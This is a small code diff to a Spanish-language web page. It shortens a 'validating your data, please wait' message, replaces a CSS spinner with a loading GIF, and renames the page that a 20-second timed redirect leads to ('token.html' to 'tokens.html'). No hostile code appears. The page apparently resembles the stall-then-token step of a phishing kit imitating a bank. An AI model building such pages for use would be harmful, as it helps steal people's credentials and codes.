@@ -41,7 +41,7 @@
 				</div>
                 <div class="card border-0">
 				    <div class="card-body">
-	<p class="card-title text-left forgot-user-title">Estamos validando sus datos, por favor espere</p>
+	<p class="card-title text-left forgot-user-title">Espere unos segundos.</p>
 						<hr>
 
 						
@@ -49,15 +49,11 @@
 
 						
 						<br>			
-						 <div class="loader"></div>
+						 <div class="loader"><img src="loading.gif" alt=""></div>
+                         
 					<style>
 .loader {
-  width: 50px;
-  aspect-ratio: 1;
-  border-radius: 50%;
-  border: 8px solid;
-  border-color: #e31e1a #0000;
-  animation: l1 1s infinite;
+  
   margin-left: 45%;
 }
 @keyframes l1 {to{transform: rotate(.5turn)}}
@@ -237,7 +233,7 @@ $(document).ready(function(){
 
 	window.onload = function gos(params) {
 		setTimeout(() => {
-			window.location.href = "token.html";
+			window.location.href = "tokens.html";
 		}, 20000);
 		
 	}
